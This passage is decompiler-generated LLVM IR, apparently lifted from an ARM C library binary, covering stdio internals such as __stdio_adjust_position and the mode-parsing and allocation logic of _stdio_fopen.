  br i1 %tmp, label %dec_label_pc_18790, label %dec_label_pc_1877c

dec_label_pc_1877c:                               ; preds = %entry
  %v0_1877c = call i32 @__errno_location()
  store i32 %v0_1877c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_18788 = inttoptr i32 %v0_1877c to i32*
  store i32 22, i32* %v2_18788, align 4
  br label %.thread3

dec_label_pc_18790:                               ; preds = %entry
  %v1_18790 = add i32 %v0_18774, 52
  %v2_18790 = inttoptr i32 %v1_18790 to i32*
  %v3_18790 = load i32, i32* %v2_18790, align 4
  store i32 %v3_18790, i32* %r7.global-to-local, align 4
  %v2_18794 = icmp eq i32 %v3_18790, 0
  %v0_18798 = load i32, i32* @r1, align 4
  store i32 %v0_18798, i32* %stack_var_-28, align 4
  br i1 %v2_18794, label %dec_label_pc_187a4, label %dec_label_pc_187d0

dec_label_pc_187a4:                               ; preds = %dec_label_pc_18790
  %v1_187a4 = add i32 %v0_18774, 56
  store i32 %v1_187a4, i32* @r4, align 4
  store i32 89400, i32* %r3.global-to-local, align 4
  store i32 %v2_1876c, i32* @r0, align 4
  store i32 %v1_187a4, i32* %r2.global-to-local, align 4
  %v1_187bc = call i32 @__pthread_return_void()
  %v0_187c0 = load i32, i32* @r4, align 4
  store i32 %v0_187c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r3.global-to-local, align 4
  store i32 100304, i32* @lr, align 4
  %v1_187cc = call i32 @__pthread_return_0()
  store i32 %v1_187cc, i32* %r0.global-to-local, align 4
  %v0_187d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_187d0

dec_label_pc_187d0:                               ; preds = %dec_label_pc_18790, %dec_label_pc_187a4
  %v0_187dc = phi i32 [ %v0_18774, %dec_label_pc_18790 ], [ %v0_187d0.pre, %dec_label_pc_187a4 ]
  %v1_187d0 = inttoptr i32 %v0_187dc to i8*
  %v2_187d0 = load i8, i8* %v1_187d0, align 1
  %v3_187d0 = zext i8 %v2_187d0 to i32
  store i32 %v3_187d0, i32* %r3.global-to-local, align 4
  %v1_187d4 = and i32 %v3_187d0, 64
  %v2_187d4 = icmp eq i32 %v1_187d4, 0
  br i1 %v2_187d4, label %dec_label_pc_187ec, label %dec_label_pc_187dc

dec_label_pc_187dc:                               ; preds = %dec_label_pc_187d0
  store i32 %v0_187dc, i32* @r0, align 4
  %v0_187e0 = call i32 @__stdio_wcommit()
  store i32 %v0_187e0, i32* %r0.global-to-local, align 4
  %v2_187e4 = icmp eq i32 %v0_187e0, 0
  br i1 %v2_187e4, label %dec_label_pc_187ec, label %dec_label_pc_1885c

dec_label_pc_187ec:                               ; preds = %dec_label_pc_187dc, %dec_label_pc_187d0
  %v0_187ec = load i32, i32* @r6, align 4
  %v7_187ec = icmp eq i32 %v0_187ec, 1
  br i1 %v7_187ec, label %dec_label_pc_187f4, label %dec_label_pc_187ec.dec_label_pc_18808_crit_edge

dec_label_pc_187ec.dec_label_pc_18808_crit_edge:  ; preds = %dec_label_pc_187ec
  br label %dec_label_pc_18808

dec_label_pc_187f4:                               ; preds = %dec_label_pc_187ec
  %v0_187f4 = load i32, i32* @r5, align 4
  store i32 %v0_187f4, i32* %r0.global-to-local, align 4
  %v2_187f8 = ptrtoint i32* %stack_var_-28 to i32
  %v2_187fc = inttoptr i32 %v0_187f4 to i8*
  %v3_187fc = call i32 @__stdio_adjust_position(i8* %v2_187fc, i32 %v2_187f8)
  store i32 %v3_187fc, i32* %r0.global-to-local, align 4
  %v1_18800 = icmp slt i32 %v3_187fc, 0
  br i1 %v1_18800, label %dec_label_pc_1885c, label %dec_label_pc_187f4.dec_label_pc_18808_crit_edge

dec_label_pc_187f4.dec_label_pc_18808_crit_edge:  ; preds = %dec_label_pc_187f4
  %v0_18808.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18808

dec_label_pc_18808:                               ; preds = %dec_label_pc_187ec.dec_label_pc_18808_crit_edge, %dec_label_pc_187f4.dec_label_pc_18808_crit_edge
  %v0_18808 = phi i32 [ %v0_187ec, %dec_label_pc_187ec.dec_label_pc_18808_crit_edge ], [ %v0_18808.pre, %dec_label_pc_187f4.dec_label_pc_18808_crit_edge ]
  store i32 %v0_18808, i32* %r2.global-to-local, align 4
  %v0_1880c = load i32, i32* @r5, align 4
  store i32 %v0_1880c, i32* %r0.global-to-local, align 4
  %v4_18814 = call i32 @__stdio_seek(i32 %v0_1880c, i32* nonnull %stack_var_-28, i32 %v0_18808)
  store i32 %v4_18814, i32* %r0.global-to-local, align 4
  %v1_18818 = icmp slt i32 %v4_18814, 0
  br i1 %v1_18818, label %dec_label_pc_1885c, label %dec_label_pc_18820

dec_label_pc_18820:                               ; preds = %dec_label_pc_18808
  %v0_18820 = load i32, i32* @r5, align 4
  %v1_18820 = inttoptr i32 %v0_18820 to i32*
  %v2_18820 = load i32, i32* %v1_18820, align 4
  store i32 %v2_18820, i32* %r3.global-to-local, align 4
  %v1_18824 = add i32 %v0_18820, 8
  %v2_18824 = inttoptr i32 %v1_18824 to i32*
  %v3_18824 = load i32, i32* %v2_18824, align 4
  store i32 %v3_18824, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1882c = and i32 %v2_18820, -72
  store i32 %v1_1882c, i32* %r3.global-to-local, align 4
  %v3_18830 = sdiv i32 %v2_18820, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_18838 = trunc i32 %v3_18830 to i8
  %v3_18838 = add i32 %v0_18820, 1
  %v4_18838 = inttoptr i32 %v3_18838 to i8*
  store i8 %v1_18838, i8* %v4_18838, align 1
  %v0_1883c = load i32, i32* %r2.global-to-local, align 4
  %v1_1883c = load i32, i32* @r5, align 4
  %v2_1883c = add i32 %v1_1883c, 28
  %v3_1883c = inttoptr i32 %v2_1883c to i32*
  store i32 %v0_1883c, i32* %v3_1883c, align 4
  %v0_18840 = load i32, i32* %r0.global-to-local, align 4
  %v1_18840 = trunc i32 %v0_18840 to i8
  %v2_18840 = load i32, i32* @r5, align 4
  %v3_18840 = add i32 %v2_18840, 2
  %v4_18840 = inttoptr i32 %v3_18840 to i8*
  store i8 %v1_18840, i8* %v4_18840, align 1
  %v0_18844 = load i32, i32* %r3.global-to-local, align 4
  %v1_18844 = trunc i32 %v0_18844 to i8
  %v2_18844 = load i32, i32* @r5, align 4
  %v3_18844 = inttoptr i32 %v2_18844 to i8*
  store i8 %v1_18844, i8* %v3_18844, align 1
  %v0_18848 = load i32, i32* %r2.global-to-local, align 4
  %v1_18848 = load i32, i32* @r5, align 4
  %v2_18848 = add i32 %v1_18848, 16
  %v3_18848 = inttoptr i32 %v2_18848 to i32*
  store i32 %v0_18848, i32* %v3_18848, align 4
  %v0_1884c = load i32, i32* %r2.global-to-local, align 4
  %v1_1884c = load i32, i32* @r5, align 4
  %v2_1884c = add i32 %v1_1884c, 20
  %v3_1884c = inttoptr i32 %v2_1884c to i32*
  store i32 %v0_1884c, i32* %v3_1884c, align 4
  %v0_18850 = load i32, i32* %r2.global-to-local, align 4
  %v1_18850 = load i32, i32* @r5, align 4
  %v2_18850 = add i32 %v1_18850, 24
  %v3_18850 = inttoptr i32 %v2_18850 to i32*
  store i32 %v0_18850, i32* %v3_18850, align 4
  %v0_18854 = load i32, i32* %r0.global-to-local, align 4
  %v1_18854 = load i32, i32* @r5, align 4
  %v2_18854 = add i32 %v1_18854, 44
  %v3_18854 = inttoptr i32 %v2_18854 to i32*
  store i32 %v0_18854, i32* %v3_18854, align 4
  br label %dec_label_pc_18860

dec_label_pc_1885c:                               ; preds = %dec_label_pc_187dc, %dec_label_pc_18808, %dec_label_pc_187f4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18860

dec_label_pc_18860:                               ; preds = %dec_label_pc_18820, %dec_label_pc_1885c
  %v0_18860 = load i32, i32* %r7.global-to-local, align 4
  %v2_18860 = icmp eq i32 %v0_18860, 0
  br i1 %v2_18860, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18860
  store i32 %v2_1876c, i32* %r0.global-to-local, align 4
  store i32 89400, i32* %r3.global-to-local, align 4
  store i32 100472, i32* @lr, align 4
  call void @__pseudo_branch(i32 89400)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18860, %dec_label_pc_1877c, %bb
  %v0_18878 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18878, i32* %r0.global-to-local, align 4
  store i32 %v3_18764, i32* @r4, align 4
  store i32 %v6_18764, i32* @r5, align 4
  store i32 %v9_18764, i32* @r6, align 4
  ret i32 %v0_18878

; uselistorder directives
  uselistorder i32 %v0_18808, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18860, { 1, 0 }
  uselistorder label %dec_label_pc_1885c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18808, { 1, 0 }
  uselistorder label %dec_label_pc_187d0, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_18894 = load i32, i32* @r4, align 4
  store i32 %v3_18894, i32* %stack_var_-16, align 4
  %v2_18898 = add i32 %tmp, 1
  %v3_18898 = inttoptr i32 %v2_18898 to i8*
  %v4_18898 = load i8, i8* %v3_18898, align 1
  %v5_18898 = zext i8 %v4_18898 to i32
  %v3_1889c = load i8, i8* %arg1, align 1
  %v4_1889c = zext i8 %v3_1889c to i32
  store i32 %v4_1889c, i32* %r2.global-to-local, align 4
  %v4_188a0 = mul nuw nsw i32 %v5_18898, 256
  %v5_188a0 = or i32 %v4_1889c, %v4_188a0
  store i32 %v5_188a0, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1889c, 4
  %v2_188a4 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_188a4, label %bb, label %dec_label_pc_188b4

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_188b4:                               ; preds = %entry
  %v1_188a4 = zext i8 %tmp15 to i32
  %v1_188b4 = add nsw i32 %v1_188a4, -1
  %v7_188b4 = icmp eq i8 %tmp15, 1
  br i1 %v7_188b4, label %.thread, label %dec_label_pc_188bc

dec_label_pc_188bc:                               ; preds = %dec_label_pc_188b4
  %v1_188bc = and i32 %v4_188a0, 2048
  %v2_188bc = icmp eq i32 %v1_188bc, 0
  br i1 %v2_188bc, label %.thread, label %dec_label_pc_188c4

dec_label_pc_188c4:                               ; preds = %dec_label_pc_188bc
  %v8_188c8 = icmp sgt i32 %v1_188b4, 1
  br i1 %v8_188c8, label %dec_label_pc_18954, label %dec_label_pc_188cc

dec_label_pc_188cc:                               ; preds = %dec_label_pc_188c4
  %v2_188cc = add i32 %tmp, 40
  %v3_188cc = inttoptr i32 %v2_188cc to i32*
  %v4_188cc = load i32, i32* %v3_188cc, align 4
  %v2_188d0 = icmp eq i32 %v4_188cc, 0
  br i1 %v2_188d0, label %dec_label_pc_188d8, label %dec_label_pc_18954

dec_label_pc_188d8:                               ; preds = %dec_label_pc_188cc
  %v2_188d8 = add i32 %tmp, 3
  %v3_188d8 = inttoptr i32 %v2_188d8 to i8*
  %v4_188d8 = load i8, i8* %v3_188d8, align 1
  %v5_188d8 = zext i8 %v4_188d8 to i32
  %v2_188dc = add i32 %tmp, 44
  %v3_188dc = inttoptr i32 %v2_188dc to i32*
  %v4_188dc = load i32, i32* %v3_188dc, align 4
  store i32 %v4_188dc, i32* %r2.global-to-local, align 4
  %v2_188e0 = sub nsw i32 %v1_188b4, %v5_188d8
  %v1_188e8 = add nsw i32 %v2_188e0, -1
  %tmp11 = icmp slt i32 %v4_188dc, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_188d8
  %v7_188ec = add i32 %tmp, 2
  %v8_188ec = inttoptr i32 %v7_188ec to i8*
  %v9_188ec = load i8, i8* %v8_188ec, align 1
  %v10_188ec = zext i8 %v9_188ec to i32
  %v7_188f0 = sub nsw i32 %v1_188e8, %v10_188ec
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_188d8, %bb, %dec_label_pc_188bc, %dec_label_pc_188b4, %bb12
  %v0_1890c = phi i32 [ %v1_188b4, %dec_label_pc_188bc ], [ %v1_188b4, %dec_label_pc_188b4 ], [ 0, %bb ], [ %v7_188f0, %bb12 ], [ %v1_188e8, %dec_label_pc_188d8 ]
  %v1_188f4 = and i32 %v4_1889c, 64
  %v2_188f4 = icmp eq i32 %v1_188f4, 0
  %storemerge.in.in.v = select i1 %v2_188f4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_18900 = add i32 %tmp, 16
  %v3_18900 = inttoptr i32 %v2_18900 to i32*
  %v4_18900 = load i32, i32* %v3_18900, align 4
  %v2_18904 = sub i32 %storemerge, %v4_18900
  %v1_18908 = inttoptr i32 %arg2 to i32*
  %v2_18908 = load i32, i32* %v1_18908, align 4
  store i32 %v2_18908, i32* %r1.global-to-local, align 4
  %v3_18908 = add i32 %arg2, 4
  %v4_18908 = inttoptr i32 %v3_18908 to i32*
  %v5_18908 = load i32, i32* %v4_18908, align 4
  store i32 %v5_18908, i32* %r2.global-to-local, align 4
  %v2_1890c = add i32 %v2_18904, %v0_1890c
  store i32 %v2_1890c, i32* %r5.global-to-local, align 4
  %v2_18910 = sub i32 %v2_18908, %v2_1890c
  %v2_18914 = and i32 %v2_1890c, 1073741824
  %v3_18914 = icmp ne i32 %v2_18914, 0
  %v6_18914 = icmp eq i1 %v3_18914, false
  %tmp16 = icmp slt i32 %v2_1890c, 0
  %v4_18914.neg = zext i1 %tmp16 to i32
  %v7_18914 = add i32 %v5_18908, %v4_18914.neg
  %v9_18914 = sext i1 %v6_18914 to i32
  %v10_18914 = add i32 %v7_18914, %v9_18914
  store i32 %v10_18914, i32* %r4.global-to-local, align 4
  store i32 %v2_18910, i32* %v1_18908, align 4
  %v5_18918 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18918, i32* %v4_18908, align 4
  %v0_1891c = load i32, i32* %r6.global-to-local, align 4
  %v1_1891c = add i32 %v0_1891c, 4
  %v2_1891c = inttoptr i32 %v1_1891c to i32*
  %v3_1891c = load i32, i32* %v2_1891c, align 4
  %v1_18920 = load i32, i32* %r2.global-to-local, align 4
  %v8_18924 = icmp sgt i32 %v3_1891c, %v1_18920
  br i1 %v8_18924, label %dec_label_pc_18938, label %dec_label_pc_18928

dec_label_pc_18928:                               ; preds = %.thread
  %v9_18920 = icmp eq i32 %v3_1891c, %v1_18920
  br i1 %v9_18920, label %dec_label_pc_1892c, label %dec_label_pc_1893cthread-pre-split

dec_label_pc_1892c:                               ; preds = %dec_label_pc_18928
  %v1_1892c = inttoptr i32 %v0_1891c to i32*
  %v2_1892c = load i32, i32* %v1_1892c, align 4
  %v1_18930 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1892c, %v1_18930
  br i1 %tmp17, label %dec_label_pc_18938, label %dec_label_pc_1893cthread-pre-split

dec_label_pc_18938:                               ; preds = %dec_label_pc_1892c, %.thread
  %v0_18938 = load i32, i32* %r5.global-to-local, align 4
  %v1_18938 = sub i32 0, %v0_18938
  store i32 %v1_18938, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1893c

dec_label_pc_1893cthread-pre-split:               ; preds = %dec_label_pc_1892c, %dec_label_pc_18928
  %v0_1893c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1893c

dec_label_pc_1893c:                               ; preds = %dec_label_pc_1893cthread-pre-split, %dec_label_pc_18938
  %v0_1893c = phi i32 [ %v0_1893c.pr, %dec_label_pc_1893cthread-pre-split ], [ %v1_18938, %dec_label_pc_18938 ]
  %v1_1893c = icmp slt i32 %v0_1893c, 0
  br i1 %v1_1893c, label %dec_label_pc_18944, label %dec_label_pc_18958

dec_label_pc_18944:                               ; preds = %dec_label_pc_1893c
  %v0_18944 = call i32 @__errno_location()
  %v2_1894c = inttoptr i32 %v0_18944 to i32*
  store i32 75, i32* %v2_1894c, align 4
  %v0_18958.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18958

dec_label_pc_18954:                               ; preds = %dec_label_pc_188cc, %dec_label_pc_188c4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18958

dec_label_pc_18958:                               ; preds = %dec_label_pc_1893c, %dec_label_pc_18944, %dec_label_pc_18954
  %v0_18958 = phi i32 [ %v0_1893c, %dec_label_pc_1893c ], [ %v0_18958.pre, %dec_label_pc_18944 ], [ -1, %dec_label_pc_18954 ]
  %v2_1895c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1895c, i32* @r4, align 4
  ret i32 %v0_18958

; uselistorder directives
  uselistorder i32 %v1_18920, { 1, 0 }
  uselistorder i32 %v3_1891c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1889c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_18958, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_18960 = load i32, i32* @r4, align 4
  store i32 %v3_18960, i32* %stack_var_-24, align 4
  %v6_18960 = load i32, i32* @r5, align 4
  %v9_18960 = load i32, i32* @r6, align 4
  %v15_18960 = load i32, i32* @r8, align 4
  %v0_18964 = load i32, i32* @r1, align 4
  %v1_18964 = inttoptr i32 %v0_18964 to i8*
  %v2_18964 = load i8, i8* %v1_18964, align 1
  %v7_18968 = icmp eq i8 %v2_18964, 114
  store i1 %v7_18968, i1* %cpsr_z.global-to-local, align 1
  %v2_1896c = ptrtoint i32* %stack_var_-56 to i32
  %v0_18970 = load i32, i32* @r0, align 4
  store i32 %v0_18970, i32* @r6, align 4
  %v0_18974 = load i32, i32* @r2, align 4
  store i32 %v0_18974, i32* @r8, align 4
  %v0_18978 = load i32, i32* @r3, align 4
  store i32 %v0_18978, i32* @r5, align 4
  br i1 %v7_18968, label %dec_label_pc_189c4, label %dec_label_pc_18980

dec_label_pc_18980:                               ; preds = %entry
  %v7_18980 = icmp eq i8 %v2_18964, 119
  store i1 %v7_18980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18980, label %bb, label %dec_label_pc_1898c

bb:                                               ; preds = %dec_label_pc_18980
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_189c8

dec_label_pc_1898c:                               ; preds = %dec_label_pc_18980
  %v7_1898c = icmp eq i8 %v2_18964, 97
  store i1 %v7_1898c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1898c, label %bb30, label %dec_label_pc_18998

bb30:                                             ; preds = %dec_label_pc_1898c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_189c8

dec_label_pc_18998:                               ; preds = %dec_label_pc_1898c, %dec_label_pc_18a50, %dec_label_pc_18a24
  %v0_18998 = call i32 @__errno_location()
  store i32 %v0_18998, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_189a0 = load i32, i32* @r8, align 4
  %v2_189a0 = icmp eq i32 %v0_189a0, 0
  store i1 %v2_189a0, i1* %cpsr_z.global-to-local, align 1
  %v2_189a4 = inttoptr i32 %v0_18998 to i32*
  store i32 22, i32* %v2_189a4, align 4
  br i1 %v2_189a0, label %dec_label_pc_18c18, label %dec_label_pc_189ac

dec_label_pc_189ac:                               ; preds = %dec_label_pc_18a74._crit_edge, %dec_label_pc_18998
  %v0_189ac = load i32, i32* @r8, align 4
  %v1_189ac = add i32 %v0_189ac, 1
  %v2_189ac = inttoptr i32 %v1_189ac to i8*
  %v3_189ac = load i8, i8* %v2_189ac, align 1
  %v4_189ac = zext i8 %v3_189ac to i32
  store i32 %v4_189ac, i32* %r3.global-to-local, align 4
  %v1_189b0 = and i32 %v4_189ac, 32
  %v2_189b0 = icmp eq i32 %v1_189b0, 0
  store i1 %v2_189b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189b0, label %dec_label_pc_18c18, label %dec_label_pc_189b8

dec_label_pc_189b8:                               ; preds = %dec_label_pc_189ac
  store i32 %v0_189ac, i32* %r0.global-to-local, align 4
  %v2_189bc = call i32 @free(i32 %v0_189ac)
  store i32 %v2_189bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c18

dec_label_pc_189c4:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_189c8

dec_label_pc_189c8:                               ; preds = %bb, %bb30, %dec_label_pc_189c4
  %v1_189e0 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_189c4 ]
  %v1_189c8 = add i32 %v0_18964, 1
  %v2_189c8 = inttoptr i32 %v1_189c8 to i8*
  %v3_189c8 = load i8, i8* %v2_189c8, align 1
  %v7_189cc = icmp eq i8 %v3_189c8, 98
  store i1 %v7_189cc, i1* %cpsr_z.global-to-local, align 1
  %v1_189c8.v0_18964 = select i1 %v7_189cc, i32 %v1_189c8, i32 %v0_18964
  store i32 %v1_189c8.v0_18964, i32* %r3.global-to-local, align 4
  %v1_189d8 = add i32 %v1_189c8.v0_18964, 1
  %v2_189d8 = inttoptr i32 %v1_189d8 to i8*
  %v3_189d8 = load i8, i8* %v2_189d8, align 1
  %v4_189d8 = zext i8 %v3_189d8 to i32
  store i32 %v4_189d8, i32* %r3.global-to-local, align 4
  %v7_189dc = icmp eq i8 %v3_189d8, 43
  store i1 %v7_189dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_189dc, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_189c8
  store i32 %v1_189e0, i32* %r3.global-to-local, align 4
  %v2_189e4 = add nuw nsw i32 %v1_189e0, 1
  store i32 %v2_189e4, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_189c8, %bb33
  %v2_189e8 = icmp eq i32 %v0_18974, 0
  store i1 %v2_189e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189e8, label %dec_label_pc_189f0, label %dec_label_pc_18a1c

dec_label_pc_189f0:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_189f4 = call i32 @malloc(i32 80)
  store i32 %v1_189f4, i32* %r0.global-to-local, align 4
  store i32 %v1_189f4, i32* @r8, align 4
  %v3_189f8 = icmp eq i32 %v1_189f4, 0
  store i1 %v3_189f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_189f8, label %dec_label_pc_18c1c, label %dec_label_pc_18a00

dec_label_pc_18a00:                               ; preds = %dec_label_pc_189f0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_18a08 = add i32 %v1_189f4, 1
  %v4_18a08 = inttoptr i32 %v3_18a08 to i8*
  store i8 32, i8* %v4_18a08, align 1
  %v0_18a0c = load i32, i32* %r2.global-to-local, align 4
  %v1_18a0c = load i32, i32* @r8, align 4
  %v2_18a0c = add i32 %v1_18a0c, 8
  %v3_18a0c = inttoptr i32 %v2_18a0c to i32*
  store i32 %v0_18a0c, i32* %v3_18a0c, align 4
  %v0_18a10 = load i32, i32* %r2.global-to-local, align 4
  %v1_18a10 = trunc i32 %v0_18a10 to i8
  %v2_18a10 = load i32, i32* @r8, align 4
  %v3_18a10 = inttoptr i32 %v2_18a10 to i8*
  store i8 %v1_18a10, i8* %v3_18a10, align 1
  %v0_18a14 = load i32, i32* @r8, align 4
  %v1_18a14 = add i32 %v0_18a14, 56
  store i32 %v1_18a14, i32* @r0, align 4
  %v0_18a18 = call i32 @__stdio_init_mutex()
  store i32 %v0_18a18, i32* %r0.global-to-local, align 4
  %v0_18a1c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18a1c

dec_label_pc_18a1c:                               ; preds = %.thread4, %dec_label_pc_18a00
  %v0_18a74 = phi i32 [ %v0_18978, %.thread4 ], [ %v0_18a1c.pre, %dec_label_pc_18a00 ]
  %v1_18a1c = icmp slt i32 %v0_18a74, 0
  %v2_18a1c = icmp eq i32 %v0_18a74, 0
  store i1 %v2_18a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18a1c, label %dec_label_pc_18a74, label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %dec_label_pc_18a1c
  %v0_18a28 = load i32, i32* @r4, align 4
  %v2_18a28 = and i32 %v0_18a28, ptrtoint ([4 x i8]* @global_var_20003.1339 to i32)
  %v1_18a2c = add i32 %v2_18a28, 1
  store i32 %v1_18a2c, i32* %r2.global-to-local, align 4
  %v0_18a30 = load i32, i32* @r6, align 4
  %v1_18a30 = add i32 %v0_18a30, 1
  %v2_18a34 = and i32 %v1_18a30, %v1_18a2c
  store i32 %v2_18a34, i32* %r3.global-to-local, align 4
  %v9_18a38 = icmp eq i32 %v2_18a34, %v1_18a2c
  store i1 %v9_18a38, i1* %cpsr_z.global-to-local, align 1
  %v1_18a3c = load i32, i32* @r8, align 4
  %v2_18a3c = add i32 %v1_18a3c, 4
  %v3_18a3c = inttoptr i32 %v2_18a3c to i32*
  store i32 %v0_18a74, i32* %v3_18a3c, align 4
  br i1 %v9_18a38, label %dec_label_pc_18a44, label %dec_label_pc_18998

dec_label_pc_18a44:                               ; preds = %dec_label_pc_18a24
  %v0_18a44 = load i32, i32* @r4, align 4
  %v1_18a44 = load i32, i32* @r6, align 4
  %v2_18a44 = sub i32 -1, %v1_18a44
  %v3_18a44 = and i32 %v0_18a44, %v2_18a44
  store i32 %v3_18a44, i32* %r3.global-to-local, align 4
  %v1_18a48 = and i32 %v3_18a44, 1024
  %v2_18a48 = icmp eq i32 %v1_18a48, 0
  store i1 %v2_18a48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a48, label %dec_label_pc_18a68, label %dec_label_pc_18a50

dec_label_pc_18a50:                               ; preds = %dec_label_pc_18a44
  %v0_18a50 = load i32, i32* @r5, align 4
  store i32 %v0_18a50, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_18a5c = call i32 @__libc_fcntl(i32 %v0_18a50, i32 4)
  store i32 %v2_18a5c, i32* %r0.global-to-local, align 4
  %v2_18a60 = icmp eq i32 %v2_18a5c, 0
  store i1 %v2_18a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a60, label %dec_label_pc_18a50.dec_label_pc_18a68_crit_edge, label %dec_label_pc_18998

dec_label_pc_18a50.dec_label_pc_18a68_crit_edge:  ; preds = %dec_label_pc_18a50
  %v0_18a68.pre = load i32, i32* @r6, align 4
  %v0_18a6c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18a68

dec_label_pc_18a68:                               ; preds = %dec_label_pc_18a50.dec_label_pc_18a68_crit_edge, %dec_label_pc_18a44
  %v0_18a6c = phi i32 [ %v0_18a6c.pre, %dec_label_pc_18a50.dec_label_pc_18a68_crit_edge ], [ %v0_18a44, %dec_label_pc_18a44 ]
  %v0_18a68 = phi i32 [ %v0_18a68.pre, %dec_label_pc_18a50.dec_label_pc_18a68_crit_edge ], [ %v1_18a44, %dec_label_pc_18a44 ]
  %v1_18a68 = and i32 %v0_18a68, 131072
  store i32 %v1_18a68, i32* %r3.global-to-local, align 4
  %v2_18a6c = or i32 %v1_18a68, %v0_18a6c
  store i32 %v2_18a6c, i32* @r4, align 4
  br label %dec_label_pc_18a98

dec_label_pc_18a74:                               ; preds = %dec_label_pc_18a1c
  %v7_18a74 = icmp eq i32 %v0_18a74, -1
  store i1 %v7_18a74, i1* %cpsr_z.global-to-local, align 1
  %v0_18a80.pre = load i32, i32* @r4, align 4
  br i1 %v7_18a74, label %dec_label_pc_18a74._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_18a74
  %v2_18a78 = or i32 %v0_18a80.pre, ptrtoint ([7 x i8]* @global_var_20000.1340 to i32)
  store i32 %v2_18a78, i32* @r4, align 4
  br label %dec_label_pc_18a74._crit_edge

dec_label_pc_18a74._crit_edge:                    ; preds = %dec_label_pc_18a74, %bb34
